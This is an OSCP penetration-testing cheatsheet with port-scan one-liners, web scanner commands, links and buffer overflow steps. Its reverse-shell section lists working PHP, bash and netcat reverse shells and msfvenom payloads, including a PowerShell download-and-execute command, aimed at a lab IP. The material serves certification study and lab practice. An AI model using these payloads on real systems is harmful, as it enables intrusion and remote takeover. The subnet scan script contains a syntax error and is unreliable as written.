# [SLAE]()
---
# [Walkthroughs](/Labs/Brainpan: 1)
---
# OSCP Cheatsheet

## Table of contents
* <a href="#useful-tools-on-kali)">[Useful tools (on Kali)](#useful-tools-on-kali)</a>
* <a href="#ports-discovery-without-nmap">[Ports discovery without nmap](#ports-discovery-without-nmap)</a>
* <a href="#web-directories-files-scanner">[Web directories/files scanner](#web-directories-files-scanner)</a>
* <a href="#reverse-shells">[Reverse shells](#reverse-shells)</a>
* <a href="#privilege-escalation">[Privilege escalation](#privilege-escalation)</a>
  * [Linux](#linux)
  * [Windows](#windows)
* <a href="#miscellaneous">[Miscellaneous](#miscellaneous)</a>
  * [Windows](#windows)
  * [Linux](#linux)
* <a href="#useful-stuff-win-or-linux">[Useful stuff (Win or Linux)](#useful-stuff-win-or-linux)</a>  
* <a href="#simple-buffer-overflow">[Simple Buffer Overflow](#simple-buffer-overflow)</a>
* <a href="#buffer-overflow">[Buffer Overflow](#buffer-overflow)</a>

Useful sources with links

## Useful tools (on Kali)[⤴](#table-of-contents)

#### create_pattern
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
/usr/bin/msf-pattern_create
```
#### pattern_offset
```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
/usr/bin/msf-pattern_offset
```
#### nasm_shell
```
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
/usr/bin/msf-nasm_shell
```
#### msfvenom
```
/usr/share/metasploit-framework/msfvenom
/usr/bin/msfvenom
```
## Ports discovery without nmap[⤴](#table-of-contents)

#### nc + bash

Basic discovery of top ports open in 192.168.56

```
top10=(20 21 22 23 25 80 110 139 443 445 3389); for i in "${top10[@]}"; do nc -w 1 192.168.56.253 $i && echo "Port $i is open" || echo "Port $i is closed or filtered"; done
```
#### /dev/tcp/ip/port or /dev/udp/ip/port

It is possible to do the same by using the special dev files /dev/tcp/ip/port or /dev/udp/ip/port (for example if nc is not found):

```
top10=(20 21 22 23 25 80 110 139 443 445 3389); for i in "${top10[@]}"; do (echo > /dev/tcp/192.168.30.253/"$i") > /dev/null 2>&1 && echo "Port $i is open" || echo "Port $i is closed"; done
```
We can also write a simple script that will perform a scan on a C-class subnet
```
#!/bin/bash
subnet="192.168.56"
top10=(20 21 22 23 25 80 110 139 443 445 3389)
for host in range {1..255}; do
    for port in "${top10[@]}"; do
        (echo > /dev/tcp/"${subnet}.${host}/${port}") > /dev/null 2>& && echo "Host ${subnet}.${host} has ${port} open" || "Host ${subnet}.${host} has ${port} closed"
    done
done
```

## Web directories/files scanner[⤴](#table-of-contents)

### Dirsearch
```
python3 dirsearch.py -u <URL> -e <EXTENSION>
```

### Nikto
```
nikto -Format txt -o webscan/nikto-initial -host http://192.168.56.101 -p 8080
```

### Gobuster
```
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,py -o webscan/gobuster-extensions
```

### ffuf
```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.56.101/FUZZ
```

## Reverse shells[⤴](#table-of-contents)

### PHP
```
?php $sock = fsockopen("192.168.56.101","443"); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>
```
```
php -r '$sock=fsockopen("192.168.56.101",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Bash

```
bash -i >& /dev/tcp/192.168.56.101/443 0>&1
```

### Sh + nc

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.56.101 443 >/tmp/f
```

### Perl (example deploy as cgi-bin)
```
msfvenom -p cmd/unix/reverse_perl LHOST="192.168.56.101" LPORT=443 -f raw -o reverse_shell.cgi
```

### Java (example to deploy on tomcat)
```
msfvenom -p java/shell_reverse_tcp LHOST=192.168.56.101 LPORT=443 -f war  rev_shell.war
```
### Windows HTPP download reverse shell
```
msfvenom -a x86 --platform windows -p windows/exec CMD="powershell \"IEX(New-Object Net.WebClient).downloadString('http://192.168.56.101/Invoke-PowerShellTcp.ps1')\"" -e x86/unicode_mixed BufferRegister=EAX -f python
```

### Windows staged reverse TCP
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
```

### Windows staged reverse TCP

## Privilege Escalation[⤴](#table-of-contents)
### Linux
* https://gtfobins.github.io/#+non-interactive%20bind%20shell
* https://book.hacktricks.xyz/linux-unix/privilege-escalation
* https://guif.re/linuxeop
* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
* https://www.win.tue.nl/~aeb/linux/hh/hh-8.html
* http://www.dankalia.com/tutor/01005/0100501004.htm <br>

### Windows

* https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
* https://github.com/worawit/MS17-010 <-- EternalBlue without msf
* http://www.fuzzysecurity.com/tutorials/16.html
* https://github.com/ankh2054/windows-pentest
* https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
* https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html
* https://github.com/frizb/Windows-Privilege-Escalation

## Miscellaneous[⤴](#table-of-contents)

### Windows

* http://www.cheat-sheets.org/saved-copy/Windows_folders_quickref.pdf
* https://www.lemoda.net/windows/windows2unix/windows2unix.html
* https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html
* https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/
* https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html
* https://malicious.link/post/2016/kerberoast-pt1/

### Linux 

* http://www.pathname.com/fhs/pub/fhs-2.3.html
* https://github.com/rapid7/ssh-badkeys
* http://www.linusakesson.net/programming/tty/
* http://pentestmonkey.net/blog/post-exploitation-without-a-tty

## Useful stuff (Win or Linux)[⤴](#table-of-contents)

### Windows check architecture
```
wmic os get osarchitecture
echo %PROCESSOR_ARCHITECTURE%
```

### Windows check OS info
```
systeminfo
ver
```

### Powershell running as 32 or 64 bits
```
[Environment]::Is64BitProcess  
```

### Linux LFI - intesresting files to look after
```
/proc/self/status
/proc/self/environ
/etc/passwd
/etc/hosts
/etc/exports
```

## Simple Buffer Overflow (32 bits, NO ASLR and NO DEP)[⤴](#table-of-contents)
Steps:

    0 - Crash the application
    1 - Fuzzing (find aprox number of bytes where the crash took place)
    2 - Find offset
    3 - EIP control
    4 - Check for enough space on buffer
    5 - Badchars counting
    6 - Find return address (JMP ESP)
    7 - Create payload

### Badchars

most common ones
```
\x00 --> null byte
\x0a --> new line character (also known as "\n")
```

## Buffer Overflow[⤴](#table-of-contents)
* https://github.com/justinsteven/dostackbufferoverflowgood
* https://github.com/stephenbradshaw/vulnserver
* https://medium.com/@mrd15rup7or/brainpan-1-walkthrough-64415565c3
* https://exploit.education/phoenix/
* https://0xrick.github.io/binary-exploitation/bof5/
* https://www.radiojitter.com/buffer-overflow-exploit-part-2/
* https://medium.com/bugbountywriteup/windows-expliot-dev-101-e5311ac284a

## Obfuscators[⤴](#table-of-contents)
* https://github.com/danielbohannon/Invoke-Obfuscation
* https://github.com/Bashfuscator/Bashfuscator

## Deobfuscators[⤴](#table-of-contents)
* https://www.unphp.net/ <-- Online php decoder
* https://lelinhtinh.github.io/de4js/ <-- JS deobfuscator and unpacker
* http://jsnice.org/ <-- Statistical renaming, type inference and deobfuscation

## Compiling exploits[⤴](#table-of-contents)
* https://stackoverflow.com/questions/4032373/linking-against-an-old-version-of-libc-to-provide-greater-application-coverage
* https://www.lordaro.co.uk/posts/2018-08-26-compiling-glibc.html
* https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/

## Brute force/Cracking[⤴](#table-of-contents)
* https://hashcat.net/wiki/doku.php?id=example_hashes
* https://github.com/Coalfire-Research/npk
* https://github.com/danielmiessler/SecLists
* https://github.com/rapid7/ssh-badkeys
* https://crackstation.net/

## Pivoting[⤴](#table-of-contents)
* https://artkond.com/2017/03/23/pivoting-guide/
* https://nullsweep.com/pivot-cheatsheet-for-pentesters/
* https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html

## Additional OSCP Cheatsheets[⤴](#table-of-contents)
* https://github.com/Optixal/OSCP-PWK-Notes-
* https://sushant747.gitbooks.io/total-oscp-guide/transfering_files.html
* https://chryzsh.gitbooks.io/pentestbook/oscp.html
* https://github.com/Optixal/OSCP-PWK-Notes-Public


